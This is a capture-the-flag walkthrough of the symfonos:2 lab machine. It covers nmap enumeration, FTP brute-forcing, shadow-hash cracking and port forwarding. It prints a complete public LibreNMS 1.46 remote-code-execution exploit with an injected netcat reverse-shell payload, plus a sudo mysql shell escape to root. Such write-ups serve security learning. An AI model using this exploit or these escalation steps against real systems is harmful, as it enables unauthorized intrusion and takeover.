[*] symfonos [*]

# Date : 23/01/2022

# ->Enumeration Phase:

# Nmap 7.91 scan initiated Sun Jan 23 12:09:28 2022 as: nmap -sC -sV -v -p- -oN nmap_all 192.168.0.114
Nmap scan report for 192.168.0.114
Host is up (0.00022s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)
|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
80/tcp  open  http        WebFS httpd 1.21
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: webfs/1.21
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:BA:6C:48 (Oracle VirtualBox virtual NIC)
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m06s, deviation: 3h27m52s, median: 5s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos2
|   NetBIOS computer name: SYMFONOS2\x00
|   Domain name: \x00
|   FQDN: symfonos2
|_  System time: 2022-01-23T00:39:49-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-23T06:39:48
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 23 12:09:47 2022 -- 1 IP address (1 host up) scanned in 18.97 seconds


>> ftp has no anonymous login,so i enumerate  smb.
>> smbclient display three shares.

Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      
	IPC$            IPC       IPC Service (Samba 4.5.16-Debian)

>> but odd share is anonymous so login into this share.i found backup directory in which log.txt file is present.
>> in that file i found username of machine.

>> so i bruteforce the ftp account of that user.
>> success

# [21][ftp] host: 192.168.0.114   login: aeolus   password: sergioteamo

>> after login into the ftp account i found shadow.bak backup file in /var/backups folder
>> so i get  this backup file from ftp service and crack the hashes of users present in the machine.
>> i found password for aeolus user.

# ssh creds

# username : aeolus
# password : sergioteamo

>> after enumeration found nothing.
>> then i  check which ports are open on localhost and i see extra 3 ports are open

>> 1] 25 (smtp)
>> 2] 3306 (mysql)
>> 3] 8080 (proxy)

>> so i forward the all these ports using ssh local port forwarding.

# ssh -L 3306:127.0.0.1:3306 aeolus@<IP>

>> then i visit port 8080. on port 8080 librenms service is running. this tool is used for network management and analysis.
>> so queckly serach librenms service exploits and i found 1 vulnerbility.

# Exploit : LibreNMS v1.46 authenticated Remote Code Execution

>> the download this script and perform all instructions and i got shell of cronus user.

################################

#!/usr/bin/python

'''
# Exploit Title: LibreNMS v1.46 authenticated Remote Code Execution
# Date: 24/12/2018
# Exploit Author: Askar (@mohammadaskar2)
# CVE : CVE-2018-20434
# Vendor Homepage: https://www.librenms.org/
# Version: v1.46
# Tested on: Ubuntu 18.04 / PHP 7.2.10
'''

import requests
from urllib import urlencode
import sys

if len(sys.argv) != 5:
    print "[!] Usage : ./exploit.py http://www.example.com cookies rhost rport"
    sys.exit(0)

# target (user input)
target = sys.argv[1]

# cookies (user input)
raw_cookies = sys.argv[2]

# remote host to connect to
rhost = sys.argv[3]

# remote port to connect to
rport = sys.argv[4]

# hostname to use (change it if you want)
hostname = "dummydevice"

# payload to create reverse shell
payload = "'$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f) #".format(rhost, rport)

# request headers
headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101"
    }

# request cookies
cookies = {}
for cookie in raw_cookies.split(";"):
    # print cookie
    c = cookie.split("=")
    cookies[c[0]] = c[1]


def create_new_device(url):
    raw_request = {
        "hostname": hostname,
        "snmp": "on",
        "sysName": "",
        "hardware": "",
        "os": "",
        "snmpver": "v2c",
        "os_id": "",
        "port": "",
        "transport": "udp",
        "port_assoc_mode": "ifIndex",
        "community": payload,
        "authlevel": "noAuthNoPriv",
        "authname": "",
        "authpass": "",
        "cryptopass": "",
        "authalgo": "MD5",
        "cryptoalgo": "AES",
        "force_add": "on",
        "Submit": ""
    }
    full_url = url + "/addhost/"
    request_body = urlencode(raw_request)

    # send the device creation request
    request = requests.post(
        full_url, data=request_body, cookies=cookies, headers=headers
    )
    text = request.text
    if "Device added" in text:
        print "[+] Device Created Sucssfully"
        return True
    else:
        print "[-] Cannot Create Device"
        return False


def request_exploit(url):
    params = {
        "id": "capture",
        "format": "text",
        "type": "snmpwalk",
        "hostname": hostname
        }

    # send the payload call
    request = requests.get(url + "/ajax_output.php",
        params=params,
        headers=headers,
        cookies=cookies
        )
    text = request.text
    if rhost in text:
        print "[+] Done, check your nc !"


if create_new_device(target):
    request_exploit(target)


################################
>> if above script is not working use metasploit module
>> simple search librenms on metasploit.

>> then found some mysql cridentilas in config.php file

### Database config
$config['db_host'] = 'localhost';
$config['db_port'] = '3306';
$config['db_user'] = 'librenms';
$config['db_pass'] = 'VLby8dGg4rvw33sg';
$config['db_name'] = 'librenms';
$config['db_socket'] = '';

>> now login into the mysql database.
>> but bad luck not found any interesting.

>> so at last run sudo -l and cronus user run mysql as super user(root)

# so run following command and got a root shell

# sudo  /usr/bin/mysql -e  '\! /bin/sh'

# content in proof.txt file

Congrats on rooting symfonos:2!

           ,   ,
         ,-`{-`/
      ,-~ , \ {-~~-,
    ,~  ,   ,`,-~~-,`,
  ,`   ,   { {      } }                                             }/
 ;     ,--/`\ \    / /                                     }/      /,/
;  ,-./      \ \  { {  (                                  /,;    ,/ ,/
; /   `       } } `, `-`-.___                            / `,  ,/  `,/
 \|         ,`,`    `~.___,---}                         / ,`,,/  ,`,;
  `        { {                                     __  /  ,`/   ,`,;
        /   \ \                                 _,`, `{  `,{   `,`;`
       {     } }       /~\         .-:::-.     (--,   ;\ `,}  `,`;
       \\._./ /      /` , \      ,:::::::::,     `~;   \},/  `,`;     ,-=-
        `-..-`      /. `  .\_   ;:::::::::::;  __,{     `/  `,`;     {
                   / , ~ . ^ `~`\:::::::::::<<~>-,,`,    `-,  ``,_    }
                /~~ . `  . ~  , .`~~\:::::::;    _-~  ;__,        `,-`
       /`\    /~,  . ~ , '  `  ,  .` \::::;`   <<<~```   ``-,,__   ;
      /` .`\ /` .  ^  ,  ~  ,  . ` . ~\~                       \\, `,__
     / ` , ,`\.  ` ~  ,  ^ ,  `  ~ . . ``~~~`,                   `-`--, \
    / , ~ . ~ \ , ` .  ^  `  , . ^   .   , ` .`-,___,---,__            ``
  /` ` . ~ . ` `\ `  ~  ,  .  ,  `  ,  . ~  ^  ,  .  ~  , .`~---,___
/` . `  ,  . ~ , \  `  ~  ,  .  ^  ,  ~  .  `  ,  ~  .  ^  ,  ~  .  `-,

	Contact me via Twitter @zayotic to give feedback!



 


